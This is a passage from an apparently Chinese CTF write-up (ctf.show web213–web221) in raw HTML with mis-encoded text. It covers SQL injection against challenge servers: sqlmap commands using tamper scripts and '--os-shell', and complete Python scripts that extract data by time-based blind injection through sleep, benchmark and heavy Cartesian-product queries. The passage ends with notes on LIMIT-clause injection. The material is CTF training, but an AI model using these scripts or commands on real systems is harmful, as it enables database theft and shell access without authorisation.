--safe-url&#x3D;&quot;https:&#x2F;&#x2F;c9220216-1978-4f6d-afa6-3fbba4ac7dfb.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;4ob2ad7so7hia0pjdds9df53rj&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch</code></pre><h4 id="web213-â€“os-shell"><a href="#web213-â€“os-shell" class="headerlink" title="web213(â€“os-shell)"></a>web213(â€“os-shell)</h4><p>ä½¿ç”¨åˆšæ‰çš„tamperè„šæœ¬å°±è¡Œï¼Œä½†æ˜¯æœ€åä½¿ç”¨<code>--os-shell</code>è¿›å…¥shelläº¤äº’å°±è¡Œ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;a3fc1f89-804d-42f5-a05a-16a174522da2.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;ctf.show --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;mqte5lhv097hu0km2aq9c4qqri&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;a3fc1f89-804d-42f5-a05a-16a174522da2.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --os-shell</code></pre><h4 id="web214-æ—¶é—´ç›²æ³¨"><a href="#web214-æ—¶é—´ç›²æ³¨" class="headerlink" title="web214(æ—¶é—´ç›²æ³¨)"></a>web214(æ—¶é—´ç›²æ³¨)</h4><p>åˆ·æ–°é¦–é¡µæŠ“åŒ…å¾—åˆ°æ³¨å…¥ç‚¹(æˆ‘ç”¨httpsçš„æ—¶å€™æ²¡æŠ“åˆ°ï¼Œhttpå°±å¯ä»¥äº†)</p><p><img src="web214.png" loading="lazy"></p><p>ç„¶åå°±æ˜¯è¿›è¡Œæ—¶é—´ç›²æ³¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://8b0ff336-3094-4316-b708-b0d88f596b52.challenge.ctf.show/api/"</span>i <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagx,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flaga,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flaga from ctfshow_flagx"</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1)"</span></span><span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'0'</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h4><p>ä½¿ç”¨å•å¼•å·é—­åˆï¼Œåé¢ä½¿ç”¨<code>#</code>æˆ–è€…é—­åˆ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://1959b6f7-1317-4f83-a586-f487063f8d90.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagxc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagaa,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaa from ctfshow_flagxc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1) and '1'='1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web216-to-base64"><a href="#web216-to-base64" class="headerlink" title="web216(to_base64)"></a>web216(to_base64)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select id from ctfshow_info where ip &#x3D; from_base64(127.0.0.1);</code></pre><p>å°†Payloadè¿›è¡Œbase64ç¼–ç å¹¶é—­åˆå³å¯</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://7d8b8dba-70c3-4c4e-8065-f936f72d0187.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagxcc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagaac,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxcc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"'MQ==') or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1)#"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web217-benchmark"><a href="#web217-benchmark" class="headerlink" title="web217(benchmark)"></a>web217(benchmark)</h4><p><code>sleep</code>è¢«banäº†</p><p><a href="https://www.cnblogs.com/c1e4r/articles/9060525.html">sqlæ—¶é—´ç›²æ³¨å¦å¤–ä¸¤ç§æ–¹å¼(benchmark,heavy query)</a></p><p><strong>benchmark()</strong></p><p>benchmarkæ˜¯Mysqlçš„ä¸€ä¸ªå†…ç½®å‡½æ•°,å…¶ä½œç”¨æ˜¯æ¥æµ‹è¯•ä¸€äº›å‡½æ•°çš„æ‰§è¡Œé€Ÿåº¦ã€‚benchmark()ä¸­å¸¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ‰§è¡Œçš„æ¬¡æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯è¦æ‰§è¡Œçš„å‡½æ•°æˆ–è€…æ˜¯è¡¨è¾¾å¼</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select BENCHMARK(10000,md5(&#39;a&#39;));+---------------------------+| BENCHMARK(10000,md5(&#39;a&#39;)) |+---------------------------+|                         0 |+---------------------------+1 row in set (0.00 sec)mysql&gt; select BENCHMARK(1000000,md5(&#39;a&#39;));+-----------------------------+| BENCHMARK(1000000,md5(&#39;a&#39;)) |+-----------------------------+|                           0 |+-----------------------------+1 row in set (0.33 sec)mysql&gt; select BENCHMARK(10000000,md5(&#39;a&#39;));+------------------------------+| BENCHMARK(10000000,md5(&#39;a&#39;)) |+------------------------------+|                            0 |+------------------------------+1 row in set (2.93 sec)</code></pre><p>å¯ä»¥çœ‹åˆ°,æ‰§è¡Œä¸åŒçš„æ¬¡æ•°é‚£ä¹ˆæ‰§è¡Œçš„æ—¶é—´ä¹Ÿå°±ä¸ä¸€æ ·ï¼Œé€šè¿‡è¿™ä¸ªå‡½æ•°æˆ‘ä»¬å¯ä»¥è¾¾åˆ°ä¸sleep()åŒæ ·çš„å»¶æ—¶ç›®çš„ã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">ip&#x3D;1) and if(2&gt;1,(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1&amp;debug&#x3D;1</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://92f2c52d-9e13-4d63-8711-5eea7dcd5ac4.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">30</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagxccb,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagaabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flagxccb"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,benchmark(700000,md5(1)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h4><p><code>benchmark</code>è¢«banäº†</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³• ä½¿ç”¨æŸ¥è¯¢è¯­å¥ æŸ¥è¯¢å¤§é‡æ•°æ®ä»è€Œæ¶ˆè€—æ—¶é—´</p><p>æœ¬åœ°å…ˆæ¼”ç¤ºä¸€æ¬¡ usersä¸€å…±å…­æ¡æ•°æ® æœ€ç»ˆä¼šæœ‰36æ¡æ•°æ® 6*6&#x3D;36 formå å¦‚æœæ˜¯é€—å· ä¼šè¿›è¡Œæ’åˆ—ç»„åˆ å¦‚æœè¡¨è¶³å¤Ÿå¤§é‚£ä¹ˆæŸ¥è¯¢çš„æ•°æ®ä¹Ÿå°±ç›¸</p><p>å½“å¤§ï¼ˆåŸç†ä¸ç”¨ç†è§£ è®°ä½è¿™ä¹ˆç”¨èƒ½æŸ¥è¯¢å¤§é‡æ•°æ®å³å¯ï¼‰è¯¥æ–¹å¼å«ç¬›å¡å°”ç§¯</p><p><img src="web218.png" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://2ba8df77-69bf-43d4-99e0-b2689ef71af6.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">7</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagxc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagaac,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token comment"># ctfshow&#123;f470e6gb-3856-42D3-ae55-402e84412f0P&#125;</span><span class="token comment"># ctfshow&#123;f47hc6hb-3856-4293-ae55-402e84412f04&#125;</span><span class="token comment"># ctfshow&#123;f470c7dh-3856-4293-ae55-402e84412f04&#125;</span><span class="token comment"># ctfshow&#123;f470c6db-3856-4293-ae55-402e84412f04&#125; âˆš</span></code></pre><h4 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h4><p>å¤šå±è”½äº†ä¸€ä¸ªrlikeï¼ˆä¹Ÿæ˜¯å»¶æ—¶çš„ä¸€ç§æ–¹æ³•ï¼‰ ä¸Šä¸€é¢˜è„šæœ¬ä¾æ—§å¯ä»¥</p><h4 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h4><p>è¿‡æ»¤äº†substr é‚£å°±ä½¿ç”¨leftå³å¯ å¹¶ä¸”è¿‡æ»¤äº†concat å¯¼è‡´æˆ‘ä»¬group_concat ä¸ èƒ½ä½¿ç”¨ ä½†æ˜¯å¯ä»¥æ˜¯ç”¨limit é€è¡Œè·å–</p><p><strong>limit N,M</strong> : ç›¸å½“äº <strong>limit M offset N</strong> , ä»ç¬¬ N æ¡è®°å½•å¼€å§‹, è¿”å› M æ¡è®°å½•</p><p>å¦å¤–asciiä¹Ÿè¢«banäº†ï¼Œæ‰€ä»¥ç›´æ¥æ¯”è¾ƒå­—ç¬¦ä¸²</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://83d3e450-cfe1-4e34-9769-2021e662fa03.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>flagdic <span class="token operator">=</span> <span class="token string">"1234567890-_&#123;&#125;qwertyuioplkjhgfdsazxcvbnm, "</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagdic<span class="token punctuation">:</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagxcac,ctfshow_info</span>        <span class="token comment"># payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagaabcc,info</span>        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabcc from ctfshow_flagxcac"</span>        tmp <span class="token operator">=</span> flag <span class="token operator">+</span> j        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) and if(left((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">',(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">' '</span><span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web221-limitæ³¨å…¥"><a href="#web221-limitæ³¨å…¥" class="headerlink" title="web221(limitæ³¨å…¥)"></a>web221(limitæ³¨å…¥)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//åˆ†é¡µæŸ¥è¯¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user <span class="token function">limit</span> <span class="token punctuation">(</span><span class="token variable">$page</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$limit</span><span class="token punctuation">,</span><span class="token variable">$limit</span><span class="token punctuation">;</span>    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:å¾ˆå®‰å…¨ï¼Œä¸éœ€è¦è¿‡æ»¤</span><span class="token comment">//æ‹¿åˆ°æ•°æ®åº“åå­—å°±ç®—ä½ èµ¢</span>      </code></pre><p>1ï¼‰<strong>limitå‰é¢æ²¡æœ‰order byæ—¶ï¼Œåé¢å¯ä»¥è·Ÿunionï¼Œå¦‚æœå­˜åœ¨order byï¼Œåˆ™ä¸èƒ½ä½¿ç”¨unionã€‚</strong></p><p>2ï¼‰limitåé¢ä¸èƒ½ç›´æ¥è·Ÿselectè¯­å¥å’Œifè¯­å¥ã€‚<strong>å¯ä»¥è·Ÿprocedureè¯­å¥ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯åªæœ‰åœ¨5.0.0&lt; MySQL &lt;5.6.6ç‰ˆæœ¬æ‰å¯ä»¥ä½¿ç”¨ï¼Œprocedureåé¢æ”¯æŒæŠ¥é”™æ³¨å…¥ä»¥åŠæ—¶é—´ç›²æ³¨</strong></p><p>3ï¼‰limit å…³é”®å­—åé¢è¿˜å¯è·ŸPROCEDUREå’Œ INTOä¸¤ä¸ªå…³é”®å­—ï¼Œä½†æ˜¯ INTO åé¢å†™å…¥æ–‡ä»¶éœ€è¦çŸ¥é“ç»å¯¹è·¯å¾„ä»¥åŠå†™å…¥shellçš„æƒé™ï¼Œå› æ­¤åˆ©ç”¨æ¯”è¾ƒéš¾ã€‚</p><p><a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/procedure-analyse.html">PROCEDURE 